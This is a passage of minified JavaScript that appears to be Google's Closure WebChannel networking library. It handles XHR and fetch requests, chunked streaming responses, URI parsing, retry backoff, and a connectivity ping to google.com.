x=h.A,R=h.R;Array.isArray(R)||(R=[String(R)]),Wc(x.i,"t",R),h.C=0,x=h.j.J,h.h=new ut,h.g=gh(h.j,x?_:null,!h.m),0<h.O&&(h.M=new zi(w(h.Y,h,h.g),h.O)),_=h.U,x=h.g,R=h.ca;var $="readystatechange";Array.isArray($)||($&&(Cr[0]=$.toString()),$=Cr);for(var ie=0;ie<$.length;ie++){var ve=al(x,$[ie],R||_.handleEvent,!1,_.h||_);if(!ve)break;_.g[ve.key]=ve}_=h.H?T(h.H):{},h.m?(h.u||(h.u="POST"),_["Content-Type"]="application/x-www-form-urlencoded",h.g.ea(h.A,h.u,h.m,_)):(h.u="GET",h.g.ea(h.A,h.u,null,_)),H(),De(h.i,h.u,h.A,h.l,h.R,h.m)}yt.prototype.ca=function(h){h=h.target;const _=this.M;_&&Wi(h)==3?_.j():this.Y(h)},yt.prototype.Y=function(h){try{if(h==this.g)e:{const fn=Wi(this.g);var _=this.g.Ba();const ms=this.g.Z();if(!(3>fn)&&(fn!=3||this.g&&(this.h.h||this.g.oa()||lh(this.g)))){this.J||fn!=4||_==7||(_==8||0>=ms?H(3):H(2)),qn(this);var x=this.g.Z();this.X=x;t:if(kn(this)){var R=lh(this.g);h="";var $=R.length,ie=Wi(this.g)==4;if(!this.h.i){if(typeof TextDecoder>"u"){Ge(this),ni(this);var ve="";break t}this.h.i=new d.TextDecoder}for(_=0;_<$;_++)this.h.h=!0,h+=this.h.i.decode(R[_],{stream:!(ie&&_==$-1)});R.length=0,this.h.g+=h,this.C=0,ve=this.h.g}else ve=this.g.oa();if(this.o=x==200,Ae(this.i,this.u,this.A,this.l,this.R,fn,x),this.o){if(this.T&&!this.K){t:{if(this.g){var dt,hn=this.g;if((dt=hn.g?hn.g.getResponseHeader("X-HTTP-Initial-Response"):null)&&!Y(dt)){var ht=dt;break t}}ht=null}if(x=ht)Ce(this.i,this.l,x,"Initial handshake response via X-HTTP-Initial-Response"),this.K=!0,sn(this,x);else{this.o=!1,this.s=3,Z(12),Ge(this),ni(this);break e}}if(this.P){x=!0;let Mn;for(;!this.J&&this.C<ve.length;)if(Mn=Ir(this,ve),Mn==qi){fn==4&&(this.s=4,Z(14),x=!1),Ce(this.i,this.l,null,"[Incomplete Response]");break}else if(Mn==Ze){this.s=4,Z(15),Ce(this.i,this.l,ve,"[Invalid Chunk]"),x=!1;break}else Ce(this.i,this.l,Mn,null),sn(this,Mn);if(kn(this)&&this.C!=0&&(this.h.g=this.h.g.slice(this.C),this.C=0),fn!=4||ve.length!=0||this.h.h||(this.s=1,Z(16),x=!1),this.o=this.o&&x,!x)Ce(this.i,this.l,ve,"[Invalid Chunked Response]"),Ge(this),ni(this);else if(0<ve.length&&!this.W){this.W=!0;var wn=this.j;wn.g==this&&wn.ba&&!wn.M&&(wn.j.info("Great, no buffering proxy detected. Bytes received: "+ve.length),fo(wn),wn.M=!0,Z(11))}}else Ce(this.i,this.l,ve,null),sn(this,ve);fn==4&&Ge(this),this.o&&!this.J&&(fn==4?fh(this.j,this):(this.o=!1,Ei(this)))}else Kp(this.g),x==400&&0<ve.indexOf("Unknown SID")?(this.s=3,Z(12)):(this.s=0,Z(13)),Ge(this),ni(this)}}}catch{}finally{}};function kn(h){return h.g?h.u=="GET"&&h.L!=2&&h.j.Ca:!1}function Ir(h,_){var x=h.C,R=_.indexOf(`
`,x);return R==-1?qi:(x=Number(_.substring(x,R)),isNaN(x)?Ze:(R+=1,R+x>_.length?qi:(_=_.slice(R,R+x),h.C=R+x,_)))}yt.prototype.cancel=function(){this.J=!0,Ge(this)};function Ei(h){h.S=Date.now()+h.I,Js(h,h.I)}function Js(h,_){if(h.B!=null)throw Error("WatchDog timer not null");h.B=pe(w(h.ba,h),_)}function qn(h){h.B&&(d.clearTimeout(h.B),h.B=null)}yt.prototype.ba=function(){this.B=null;const h=Date.now();0<=h-this.S?(Re(this.i,this.A),this.L!=2&&(H(),Z(17)),Ge(this),this.s=2,ni(this)):Js(this,this.S-h)};function ni(h){h.j.G==0||h.J||fh(h.j,h)}function Ge(h){qn(h);var _=h.M;_&&typeof _.ma=="function"&&_.ma(),h.M=null,Sr(h.U),h.g&&(_=h.g,h.g=null,_.abort(),_.ma())}function sn(h,_){try{var x=h.j;if(x.G!=0&&(x.g==h||Gi(x.h,h))){if(!h.K&&Gi(x.h,h)&&x.G==3){try{var R=x.Da.g.parse(_)}catch{R=null}if(Array.isArray(R)&&R.length==3){var $=R;if($[0]==0){e:if(!x.u){if(x.g)if(x.g.F+3e3<h.F)gl(x),ml(x);else break e;eu(x),Z(18)}}else x.za=$[1],0<x.za-x.T&&37500>$[2]&&x.F&&x.v==0&&!x.C&&(x.C=pe(w(x.Za,x),6e3));if(1>=jt(x.h)&&x.ca){try{x.ca()}catch{}x.ca=void 0}}else fs(x,11)}else if((h.K||x.g==h)&&gl(x),!Y(_))for($=x.Da.g.parse(_),_=0;_<$.length;_++){let ht=$[_];if(x.T=ht[0],ht=ht[1],x.G==2)if(ht[0]=="c"){x.K=ht[1],x.ia=ht[2];const wn=ht[3];wn!=null&&(x.la=wn,x.j.info("VER="+x.la));const fn=ht[4];fn!=null&&(x.Aa=fn,x.j.info("SVER="+x.Aa));const ms=ht[5];ms!=null&&typeof ms=="number"&&0<ms&&(R=1.5*ms,x.L=R,x.j.info("backChannelRequestTimeoutMs_="+R)),R=x;const Mn=h.g;if(Mn){const Vr=Mn.g?Mn.g.getResponseHeader("X-Client-Wire-Protocol"):null;if(Vr){var ie=R.h;ie.g||Vr.indexOf("spdy")==-1&&Vr.indexOf("quic")==-1&&Vr.indexOf("h2")==-1||(ie.j=ie.l,ie.g=new Set,ie.h&&(os(ie,ie.h),ie.h=null))}if(R.D){const nu=Mn.g?Mn.g.getResponseHeader("X-HTTP-Session-Id"):null;nu&&(R.ya=nu,It(R.I,R.D,nu))}}x.G=3,x.l&&x.l.ua(),x.ba&&(x.R=Date.now()-h.F,x.j.info("Handshake RTT: "+x.R+"ms")),R=x;var ve=h;if(R.qa=ph(R,R.J?R.ia:null,R.W),ve.K){Dn(R.h,ve);var dt=ve,hn=R.L;hn&&(dt.I=hn),dt.B&&(qn(dt),Ei(dt)),R.g=ve}else dh(R);0<x.i.length&&pl(x)}else ht[0]!="stop"&&ht[0]!="close"||fs(x,7);else x.G==3&&(ht[0]=="stop"||ht[0]=="close"?ht[0]=="stop"?fs(x,7):Zc(x):ht[0]!="noop"&&x.l&&x.l.ta(ht),x.v=0)}}H(4)}catch{}}var Ti=class{constructor(h,_){this.g=h,this.map=_}};function ui(h){this.l=h||10,d.PerformanceNavigationTiming?(h=d.performance.getEntriesByType("navigation"),h=0<h.length&&(h[0].nextHopProtocol=="hq"||h[0].nextHopProtocol=="h2")):h=!!(d.chrome&&d.chrome.loadTimes&&d.chrome.loadTimes()&&d.chrome.loadTimes().wasFetchedViaSpdy),this.j=h?this.l:1,this.g=null,1<this.j&&(this.g=new Set),this.h=null,this.i=[]}function kr(h){return h.h?!0:h.g?h.g.size>=h.j:!1}function jt(h){return h.h?1:h.g?h.g.size:0}function Gi(h,_){return h.h?h.h==_:h.g?h.g.has(_):!1}function os(h,_){h.g?h.g.add(_):h.h=_}function Dn(h,_){h.h&&h.h==_?h.h=null:h.g&&h.g.has(_)&&h.g.delete(_)}ui.prototype.cancel=function(){if(this.i=Gc(this),this.h)this.h.cancel(),this.h=null;else if(this.g&&this.g.size!==0){for(const h of this.g.values())h.cancel();this.g.clear()}};function Gc(h){if(h.h!=null)return h.i.concat(h.h.D);if(h.g!=null&&h.g.size!==0){let _=h.i;for(const x of h.g.values())_=_.concat(x.D);return _}return M(h.i)}function qp(h){if(h.V&&typeof h.V=="function")return h.V();if(typeof Map<"u"&&h instanceof Map||typeof Set<"u"&&h instanceof Set)return Array.from(h.values());if(typeof h=="string")return h.split("");if(f(h)){for(var _=[],x=h.length,R=0;R<x;R++)_.push(h[R]);return _}_=[],x=0;for(R in h)_[x++]=h[R];return _}function ll(h){if(h.na&&typeof h.na=="function")return h.na();if(!h.V||typeof h.V!="function"){if(typeof Map<"u"&&h instanceof Map)return Array.from(h.keys());if(!(typeof Set<"u"&&h instanceof Set)){if(f(h)||typeof h=="string"){var _=[];h=h.length;for(var x=0;x<h;x++)_.push(x);return _}_=[],x=0;for(const R in h)_[x++]=R;return _}}}function Yc(h,_){if(h.forEach&&typeof h.forEach=="function")h.forEach(_,void 0);else if(f(h)||typeof h=="string")Array.prototype.forEach.call(h,_,void 0);else for(var x=ll(h),R=qp(h),$=R.length,ie=0;ie<$;ie++)_.call(void 0,R[ie],x&&x[ie],h)}var no=RegExp("^(?:([^:/?#.]+):)?(?://(?:([^\\\\/?#]*)@)?([^\\\\/?#]*?)(?::([0-9]+))?(?=[\\\\/?#]|$))?([^?#]+)?(?:\\?([^#]*))?(?:#([\\s\\S]*))?$");function Gp(h,_){if(h){h=h.split("&");for(var x=0;x<h.length;x++){var R=h[x].indexOf("="),$=null;if(0<=R){var ie=h[x].substring(0,R);$=h[x].substring(R+1)}else ie=h[x];_(ie,$?decodeURIComponent($.replace(/\+/g," ")):"")}}}function an(h){if(this.g=this.o=this.j="",this.s=null,this.m=this.l="",this.h=!1,h instanceof an){this.h=h.h,io(this,h.j),this.o=h.o,this.g=h.g,ea(this,h.s),this.l=h.l;var _=h.i,x=new cs;x.i=_.i,_.g&&(x.g=new Map(_.g),x.h=_.h),ls(this,x),this.m=h.m}else h&&(_=String(h).match(no))?(this.h=!1,io(this,_[1]||"",!0),this.o=Yi(_[2]||""),this.g=Yi(_[3]||"",!0),ea(this,_[4]),this.l=Yi(_[5]||"",!0),ls(this,_[6]||"",!0),this.m=Yi(_[7]||"")):(this.h=!1,this.i=new cs(null,this.h))}an.prototype.toString=function(){var h=[],_=this.j;_&&h.push(so(_,Qc,!0),":");var x=this.g;return(x||_=="file")&&(h.push("//"),(_=this.o)&&h.push(so(_,Qc,!0),"@"),h.push(encodeURIComponent(String(x)).replace(/%25([0-9a-fA-F]{2})/g,"%$1")),x=this.s,x!=null&&h.push(":",String(x))),(x=this.l)&&(this.g&&x.charAt(0)!="/"&&h.push("/"),h.push(so(x,x.charAt(0)=="/"?Yp:Kc,!0))),(x=this.i.toString())&&h.push("?",x),(x=this.m)&&h.push("#",so(x,cl)),h.join("")};function Ci(h){return new an(h)}function io(h,_,x){h.j=x?Yi(_,!0):_,h.j&&(h.j=h.j.replace(/:$/,""))}function ea(h,_){if(_){if(_=Number(_),isNaN(_)||0>_)throw Error("Bad port number "+_);h.s=_}else h.s=null}function ls(h,_,x){_ instanceof cs?(h.i=_,ah(h.i,h.h)):(x||(_=so(_,Qp)),h.i=new cs(_,h.h))}function It(h,_,x){h.i.set(_,x)}function ro(h){return It(h,"zx",Math.floor(2147483648*Math.random()).toString(36)+Math.abs(Math.floor(2147483648*Math.random())^Date.now()).toString(36)),h}function Yi(h,_){return h?_?decodeURI(h.replace(/%25/g,"%2525")):decodeURIComponent(h):""}function so(h,_,x){return typeof h=="string"?(h=encodeURI(h).replace(_,sh),x&&(h=h.replace(/%25([0-9a-fA-F]{2})/g,"%$1")),h):null}function sh(h){return h=h.charCodeAt(0),"%"+(h>>4&15).toString(16)+(h&15).toString(16)}var Qc=/[#\/\?@]/g,Kc=/[#\?:]/g,Yp=/[#\?]/g,Qp=/[#\?@]/g,cl=/#/g;function cs(h,_){this.h=this.g=null,this.i=h||null,this.j=!!_}function Qi(h){h.g||(h.g=new Map,h.h=0,h.i&&Gp(h.i,function(_,x){h.add(decodeURIComponent(_.replace(/\+/g," ")),x)}))}t=cs.prototype,t.add=function(h,_){Qi(this),this.i=null,h=Dr(this,h);var x=this.g.get(h);return x||this.g.set(h,x=[]),x.push(_),this.h+=1,this};function us(h,_){Qi(h),_=Dr(h,_),h.g.has(_)&&(h.i=null,h.h-=h.g.get(_).length,h.g.delete(_))}function ds(h,_){return Qi(h),_=Dr(h,_),h.g.has(_)}t.forEach=function(h,_){Qi(this),this.g.forEach(function(x,R){x.forEach(function($){h.call(_,$,R,this)},this)},this)},t.na=function(){Qi(this);const h=Array.from(this.g.values()),_=Array.from(this.g.keys()),x=[];for(let R=0;R<_.length;R++){const $=h[R];for(let ie=0;ie<$.length;ie++)x.push(_[R])}return x},t.V=function(h){Qi(this);let _=[];if(typeof h=="string")ds(this,h)&&(_=_.concat(this.g.get(Dr(this,h))));else{h=Array.from(this.g.values());for(let x=0;x<h.length;x++)_=_.concat(h[x])}return _},t.set=function(h,_){return Qi(this),this.i=null,h=Dr(this,h),ds(this,h)&&(this.h-=this.g.get(h).length),this.g.set(h,[_]),this.h+=1,this},t.get=function(h,_){return h?(h=this.V(h),0<h.length?String(h[0]):_):_};function Wc(h,_,x){us(h,_),0<x.length&&(h.i=null,h.g.set(Dr(h,_),M(x)),h.h+=x.length)}t.toString=function(){if(this.i)return this.i;if(!this.g)return"";const h=[],_=Array.from(this.g.keys());for(var x=0;x<_.length;x++){var R=_[x];const ie=encodeURIComponent(String(R)),ve=this.V(R);for(R=0;R<ve.length;R++){var $=ie;ve[R]!==""&&($+="="+encodeURIComponent(String(ve[R]))),h.push($)}}return this.i=h.join("&")};function Dr(h,_){return _=String(_),h.j&&(_=_.toLowerCase()),_}function ah(h,_){_&&!h.j&&(Qi(h),h.i=null,h.g.forEach(function(x,R){var $=R.toLowerCase();R!=$&&(us(this,R),Wc(this,$,x))},h)),h.j=_}function ao(h,_){const x=new be;if(d.Image){const R=new Image;R.onload=E(Ki,x,"TestLoadImage: loaded",!0,_,R),R.onerror=E(Ki,x,"TestLoadImage: error",!1,_,R),R.onabort=E(Ki,x,"TestLoadImage: abort",!1,_,R),R.ontimeout=E(Ki,x,"TestLoadImage: timeout",!1,_,R),d.setTimeout(function(){R.ontimeout&&R.ontimeout()},1e4),R.src=h}else _(!1)}function hr(h,_){const x=new be,R=new AbortController,$=setTimeout(()=>{R.abort(),Ki(x,"TestPingServer: timeout",!1,_)},1e4);fetch(h,{signal:R.signal}).then(ie=>{clearTimeout($),ie.ok?Ki(x,"TestPingServer: ok",!0,_):Ki(x,"TestPingServer: server error",!1,_)}).catch(()=>{clearTimeout($),Ki(x,"TestPingServer: error",!1,_)})}function Ki(h,_,x,R,$){try{$&&($.onload=null,$.onerror=null,$.onabort=null,$.ontimeout=null),R(x)}catch{}}function oo(){this.g=new Fi}function Mr(h,_,x){const R=x||"";try{Yc(h,function($,ie){let ve=$;p($)&&(ve=Ai($)),_.push(R+ie+"="+encodeURIComponent(ve))})}catch($){throw _.push(R+"type="+encodeURIComponent("_badmap")),$}}function ta(h){this.l=h.Ub||null,this.j=h.eb||!1}C(ta,$s),ta.prototype.g=function(){return new hs(this.l,this.j)},ta.prototype.i=function(h){return function(){return h}}({});function hs(h,_){bt.call(this),this.D=h,this.o=_,this.m=void 0,this.status=this.readyState=0,this.responseType=this.responseText=this.response=this.statusText="",this.onreadystatechange=null,this.u=new Headers,this.h=null,this.B="GET",this.A="",this.g=!1,this.v=this.j=this.l=null}C(hs,bt),t=hs.prototype,t.open=function(h,_){if(this.readyState!=0)throw this.abort(),Error("Error reopening a connection");this.B=h,this.A=_,this.readyState=1,Pr(this)},t.send=function(h){if(this.readyState!=1)throw this.abort(),Error("need to call open() first. ");this.g=!0;const _={headers:this.u,method:this.B,credentials:this.m,cache:void 0};h&&(_.body=h),(this.D||d).fetch(new Request(this.A,_)).then(this.Sa.bind(this),this.ga.bind(this))},t.abort=function(){this.response=this.responseText="",this.u=new Headers,this.status=0,this.j&&this.j.cancel("Request was aborted.").catch(()=>{}),1<=this.readyState&&this.g&&this.readyState!=4&&(this.g=!1,Or(this)),this.readyState=0},t.Sa=function(h){if(this.g&&(this.l=h,this.h||(this.status=this.l.status,this.statusText=this.l.statusText,this.h=h.headers,this.readyState=2,Pr(this)),this.g&&(this.readyState=3,Pr(this),this.g)))if(this.responseType==="arraybuffer")h.arrayBuffer().then(this.Qa.bind(this),this.ga.bind(this));else if(typeof d.ReadableStream<"u"&&"body"in h){if(this.j=h.body.getReader(),this.o){if(this.responseType)throw Error('responseType must be empty for "streamBinaryChunks" mode responses.');this.response=[]}else this.response=this.responseText="",this.v=new TextDecoder;$c(this)}else h.text().then(this.Ra.bind(this),this.ga.bind(this))};function $c(h){h.j.read().then(h.Pa.bind(h)).catch(h.ga.bind(h))}t.Pa=function(h){if(this.g){if(this.o&&h.value)this.response.push(h.value);else if(!this.o){var _=h.value?h.value:new Uint8Array(0);(_=this.v.decode(_,{stream:!h.done}))&&(this.response=this.responseText+=_)}h.done?Or(this):Pr(this),this.readyState==3&&$c(this)}},t.Ra=function(h){this.g&&(this.response=this.responseText=h,Or(this))},t.Qa=function(h){this.g&&(this.response=h,Or(this))},t.ga=function(){this.g&&Or(this)};function Or(h){h.readyState=4,h.l=null,h.j=null,h.v=null,Pr(h)}t.setRequestHeader=function(h,_){this.u.append(h,_)},t.getResponseHeader=function(h){return this.h&&this.h.get(h.toLowerCase())||""},t.getAllResponseHeaders=function(){if(!this.h)return"";const h=[],_=this.h.entries();for(var x=_.next();!x.done;)x=x.value,h.push(x[0]+": "+x[1]),x=_.next();return h.join(`\r
`)};function Pr(h){h.onreadystatechange&&h.onreadystatechange.call(h)}Object.defineProperty(hs.prototype,"withCredentials",{get:function(){return this.m==="include"},set:function(h){this.m=h?"include":"same-origin"}});function Xc(h){let _="";return L(h,function(x,R){_+=R,_+=":",_+=x,_+=`\r
`}),_}function _n(h,_,x){e:{for(R in x){var R=!1;break e}R=!0}R||(x=Xc(x),typeof h=="string"?x!=null&&encodeURIComponent(String(x)):It(h,_,x))}function Ct(h){bt.call(this),this.headers=new Map,this.o=h||null,this.h=!1,this.v=this.g=null,this.D="",this.m=0,this.l="",this.j=this.B=this.u=this.A=!1,this.I=null,this.H="",this.J=!1}C(Ct,bt);var ul=/^https?$/i,lo=["POST","PUT"];t=Ct.prototype,t.Ha=function(h){this.J=h},t.ea=function(h,_,x,R){if(this.g)throw Error("[goog.net.XhrIo] Object is active with another request="+this.D+"; newUri="+h);_=_?_.toUpperCase():"GET",this.D=h,this.l="",this.m=0,this.A=!1,this.h=!0,this.g=this.o?this.o.g():rt.g(),this.v=this.o?as(this.o):as(rt),this.g.onreadystatechange=w(this.Ea,this);try{this.B=!0,this.g.open(_,String(h),!0),this.B=!1}catch(ie){oh(this,ie);return}if(h=x||"",x=new Map(this.headers),R)if(Object.getPrototypeOf(R)===Object.prototype)for(var $ in R)x.set($,R[$]);else if(typeof R.keys=="function"&&typeof R.get=="function")for(const ie of R.keys())x.set(ie,R.get(ie));else throw Error("Unknown input type for opt_headers: "+String(R));R=Array.from(x.keys()).find(ie=>ie.toLowerCase()=="content-type"),$=d.FormData&&h instanceof d.FormData,!(0<=Array.prototype.indexOf.call(lo,_,void 0))||R||$||x.set("Content-Type","application/x-www-form-urlencoded;charset=utf-8");for(const[ie,ve]of x)this.g.setRequestHeader(ie,ve);this.H&&(this.g.responseType=this.H),"withCredentials"in this.g&&this.g.withCredentials!==this.J&&(this.g.withCredentials=this.J);try{co(this),this.u=!0,this.g.send(h),this.u=!1}catch(ie){oh(this,ie)}};function oh(h,_){h.h=!1,h.g&&(h.j=!0,h.g.abort(),h.j=!1),h.l=_,h.m=5,dl(h),jr(h)}function dl(h){h.A||(h.A=!0,We(h,"complete"),We(h,"error"))}t.abort=function(h){this.g&&this.h&&(this.h=!1,this.j=!0,this.g.abort(),this.j=!1,this.m=h||7,We(this,"complete"),We(this,"abort"),jr(this))},t.N=function(){this.g&&(this.h&&(this.h=!1,this.j=!0,this.g.abort(),this.j=!1),jr(this,!0)),Ct.aa.N.call(this)},t.Ea=function(){this.s||(this.B||this.u||this.j?hl(this):this.bb())},t.bb=function(){hl(this)};function hl(h){if(h.h&&typeof c<"u"&&(!h.v[1]||Wi(h)!=4||h.Z()!=2)){if(h.u&&Wi(h)==4)rn(h.Ea,0,h);else if(We(h,"readystatechange"),Wi(h)==4){h.h=!1;try{const ve=h.Z();e:switch(ve){case 200:case 201:case 202:case 204:case 206:case 304:case 1223:var _=!0;break e;default:_=!1}var x;if(!(x=_)){var R;if(R=ve===0){var $=String(h.D).match(no)[1]||null;!$&&d.self&&d.self.location&&($=d.self.location.protocol.slice(0,-1)),R=!ul.test($?$.toLowerCase():"")}x=R}if(x)We(h,"complete"),We(h,"success");else{h.m=6;try{var ie=2<Wi(h)?h.g.statusText:""}catch{ie=""}h.l=ie+" ["+h.Z()+"]",dl(h)}}finally{jr(h)}}}}function jr(h,_){if(h.g){co(h);const x=h.g,R=h.v[0]?()=>{}:null;h.g=null,h.v=null,_||We(h,"ready");try{x.onreadystatechange=R}catch{}}}function co(h){h.I&&(d.clearTimeout(h.I),h.I=null)}t.isActive=function(){return!!this.g};function Wi(h){return h.g?h.g.readyState:0}t.Z=function(){try{return 2<Wi(this)?this.g.status:-1}catch{return-1}},t.oa=function(){try{return this.g?this.g.responseText:""}catch{return""}},t.Oa=function(h){if(this.g){var _=this.g.responseText;return h&&_.indexOf(h)==0&&(_=_.substring(h.length)),ss(_)}};function lh(h){try{if(!h.g)return null;if("response"in h.g)return h.g.response;switch(h.H){case"":case"text":return h.g.responseText;case"arraybuffer":if("mozResponseArrayBuffer"in h.g)return h.g.mozResponseArrayBuffer}return null}catch{return null}}function Kp(h){const _={};h=(h.g&&2<=Wi(h)&&h.g.getAllResponseHeaders()||"").split(`\r
`);for(let R=0;R<h.length;R++){if(Y(h[R]))continue;var x=j(h[R]);const $=x[0];if(x=x[1],typeof x!="string")continue;x=x.trim();const ie=_[$]||[];_[$]=ie,ie.push(x)}N(_,function(R){return R.join(", ")})}t.Ba=function(){return this.m},t.Ka=function(){return typeof this.l=="string"?this.l:String(this.l)};function uo(h,_,x){return x&&x.internalChannelParams&&x.internalChannelParams[h]||_}function fl(h){this.Aa=0,this.i=[],this.j=new be,this.ia=this.qa=this.I=this.W=this.g=this.ya=this.D=this.H=this.m=this.S=this.o=null,this.Ya=this.U=0,this.Va=uo("failFast",!1,h),this.F=this.C=this.u=this.s=this.l=null,this.X=!0,this.za=this.T=-1,this.Y=this.v=this.B=0,this.Ta=uo("baseRetryDelayMs",5e3,h),this.cb=uo("retryDelaySeedMs",1e4,h),this.Wa=uo("forwardChannelMaxRetries",2,h),this.wa=uo("forwardChannelRequestTimeoutMs",2e4,h),this.pa=h&&h.xmlHttpFactory||void 0,this.Xa=h&&h.Tb||void 0,this.Ca=h&&h.useFetchStreams||!1,this.L=void 0,this.J=h&&h.supportsCrossDomainXhr||!1,this.K="",this.h=new ui(h&&h.concurrentRequestLimit),this.Da=new oo,this.P=h&&h.fastHandshake||!1,this.O=h&&h.encodeInitMessageHeaders||!1,this.P&&this.O&&(this.O=!1),this.Ua=h&&h.Rb||!1,h&&h.xa&&this.j.xa(),h&&h.forceLongPolling&&(this.X=!1),this.ba=!this.P&&this.X&&h&&h.detectBufferingProxy||!1,this.ja=void 0,h&&h.longPollingTimeout&&0<h.longPollingTimeout&&(this.ja=h.longPollingTimeout),this.ca=void 0,this.R=0,this.M=!1,this.ka=this.A=null}t=fl.prototype,t.la=8,t.G=1,t.connect=function(h,_,x,R){Z(0),this.W=h,this.H=_||{},x&&R!==void 0&&(this.H.OSID=x,this.H.OAID=R),this.F=this.X,this.I=ph(this,null,this.W),pl(this)};function Zc(h){if(ch(h),h.G==3){var _=h.U++,x=Ci(h.I);if(It(x,"SID",h.K),It(x,"RID",_),It(x,"TYPE","terminate"),ho(h,x),_=new yt(h,h.j,_),_.L=2,_.v=ro(Ci(x)),x=!1,d.navigator&&d.navigator.sendBeacon)try{x=d.navigator.sendBeacon(_.v.toString(),"")}catch{}!x&&d.Image&&(new Image().src=_.v,x=!0),x||(_.g=gh(_.j,null),_.g.ea(_.v)),_.F=Date.now(),Ei(_)}mh(h)}function ml(h){h.g&&(fo(h),h.g.cancel(),h.g=null)}function ch(h){ml(h),h.u&&(d.clearTimeout(h.u),h.u=null),gl(h),h.h.cancel(),h.s&&(typeof h.s=="number"&&d.clearTimeout(h.s),h.s=null)}function pl(h){if(!kr(h.h)&&!h.s){h.s=!0;var _=h.Ga;me||F(),we||(me(),we=!0),Be.add(_,h),h.B=0}}function Wp(h,_){return jt(h.h)>=h.h.j-(h.s?1:0)?!1:h.s?(h.i=_.D.concat(h.i),!0):h.G==1||h.G==2||h.B>=(h.Va?0:h.Wa)?!1:(h.s=pe(w(h.Ga,h,_),tu(h,h.B)),h.B++,!0)}t.Ga=function(h){if(this.s)if(this.s=null,this.G==1){if(!h){this.U=Math.floor(1e5*Math.random()),h=this.U++;const $=new yt(this,this.j,h);let ie=this.o;if(this.S&&(ie?(ie=T(ie),I(ie,this.S)):ie=this.S),this.m!==null||this.O||($.H=ie,ie=null),this.P)e:{for(var _=0,x=0;x<this.i.length;x++){t:{var R=this.i[x];if("__data__"in R.map&&(R=R.map.__data__,typeof R=="string")){R=R.length;break t}R=void 0}if(R===void 0)break;if(_+=R,4096<_){_=x;break e}if(_===4096||x===this.i.length-1){_=x+1;break e}}_=1e3}else _=1e3;_=uh(this,$,_),x=Ci(this.I),It(x,"RID",h),It(x,"CVER",22),this.D&&It(x,"X-HTTP-Session-Id",this.D),ho(this,x),ie&&(this.O?_="headers="+encodeURIComponent(String(Xc(ie)))+"&"+_:this.m&&_n(x,this.m,ie)),os(this.h,$),this.Ua&&It(x,"TYPE","init"),this.P?(It(x,"$req",_),It(x,"SID","null"),$.T=!0,dn($,x,null)):dn($,x,_),this.G=2}}else this.G==3&&(h?Jc(this,h):this.i.length==0||kr(this.h)||Jc(this))};function Jc(h,_){var x;_?x=_.l:x=h.U++;const R=Ci(h.I);It(R,"SID",h.K),It(R,"RID",x),It(R,"AID",h.T),ho(h,R),h.m&&h.o&&_n(R,h.m,h.o),x=new yt(h,h.j,x,h.B+1),h.m===null&&(x.H=h.o),_&&(h.i=_.D.concat(h.i)),_=uh(h,x,1e3),x.I=Math.round(.5*h.wa)+Math.round(.5*h.wa*Math.random()),os(h.h,x),dn(x,R,_)}function ho(h,_){h.H&&L(h.H,function(x,R){It(_,R,x)}),h.l&&Yc({},function(x,R){It(_,R,x)})}function uh(h,_,x){x=Math.min(h.i.length,x);var R=h.l?w(h.l.Na,h.l,h):null;e:{var $=h.i;let ie=-1;for(;;){const ve=["count="+x];ie==-1?0<x?(ie=$[0].g,ve.push("ofs="+ie)):ie=0:ve.push("ofs="+ie);let dt=!0;for(let hn=0;hn<x;hn++){let ht=$[hn].g;const wn=$[hn].map;if(ht-=ie,0>ht)ie=Math.max(0,$[hn].g-100),dt=!1;else try{Mr(wn,ve,"req"+ht+"_")}catch{R&&R(wn)}}if(dt){R=ve.join("&");break e}}}return h=h.i.splice(0,x),_.D=h,R}function dh(h){if(!h.g&&!h.u){h.Y=1;var _=h.Fa;me||F(),we||(me(),we=!0),Be.add(_,h),h.v=0}}function eu(h){return h.g||h.u||3<=h.v?!1:(h.Y++,h.u=pe(w(h.Fa,h),tu(h,h.v)),h.v++,!0)}t.Fa=function(){if(this.u=null,hh(this),this.ba&&!(this.M||this.g==null||0>=this.R)){var h=2*this.R;this.j.info("BP detection timer enabled: "+h),this.A=pe(w(this.ab,this),h)}},t.ab=function(){this.A&&(this.A=null,this.j.info("BP detection timeout reached."),this.j.info("Buffering proxy detected and switch to long-polling!"),this.F=!1,this.M=!0,Z(10),ml(this),hh(this))};function fo(h){h.A!=null&&(d.clearTimeout(h.A),h.A=null)}function hh(h){h.g=new yt(h,h.j,"rpc",h.Y),h.m===null&&(h.g.H=h.o),h.g.O=0;var _=Ci(h.qa);It(_,"RID","rpc"),It(_,"SID",h.K),It(_,"AID",h.T),It(_,"CI",h.F?"0":"1"),!h.F&&h.ja&&It(_,"TO",h.ja),It(_,"TYPE","xmlhttp"),ho(h,_),h.m&&h.o&&_n(_,h.m,h.o),h.L&&(h.g.I=h.L);var x=h.g;h=h.ia,x.L=1,x.v=ro(Ci(_)),x.m=null,x.P=!0,ti(x,h)}t.Za=function(){this.C!=null&&(this.C=null,ml(this),eu(this),Z(19))};function gl(h){h.C!=null&&(d.clearTimeout(h.C),h.C=null)}function fh(h,_){var x=null;if(h.g==_){gl(h),fo(h),h.g=null;var R=2}else if(Gi(h.h,_))x=_.D,Dn(h.h,_),R=1;else return;if(h.G!=0){if(_.o)if(R==1){x=_.m?_.m.length:0,_=Date.now()-_.F;var $=h.B;R=Rr(),We(R,new le(R,x)),pl(h)}else dh(h);else if($=_.s,$==3||$==0&&0<_.X||!(R==1&&Wp(h,_)||R==2&&eu(h)))switch(x&&0<x.length&&(_=h.h,_.i=_.i.concat(x)),$){case 1:fs(h,5);break;case 4:fs(h,10);break;case 3:fs(h,6);break;default:fs(h,2)}}}function tu(h,_){let x=h.Ta+Math.floor(Math.random()*h.cb);return h.isActive()||(x*=2),x*_}function fs(h,_){if(h.j.info("Error code "+_),_==2){var x=w(h.fb,h),R=h.Xa;const $=!R;R=new an(R||"//www.google.com/images/cleardot.gif"),d.location&&d.location.protocol=="http"||io(R,"https"),ro(R),$?ao(R.toString(),x):hr(R.toString(),x)}else Z(2);h.G=0,h.l&&h.l.sa(_),mh(h),ch(h)}t.fb=function(h){h?(this.j.info("Successfully pinged google.com"),Z(2)):(this.j.info("Failed to ping google.com"),Z(1))};function mh(h){if(h.G=0,h.ka=[],h.l){const _=Gc(h.h);(_.length!=0||h.i.length!=0)&&(V(h.ka,_),V(h.ka,h.i),h.h.i.length=0,M(h.i),h.i.length=0),h.l.ra()}}function ph(h,_,x){var R=x instanceof an?Ci(x):new an(x);if(R.g!="")_&&(R.g=_+"."+R.g),ea(R,R.s);else{var 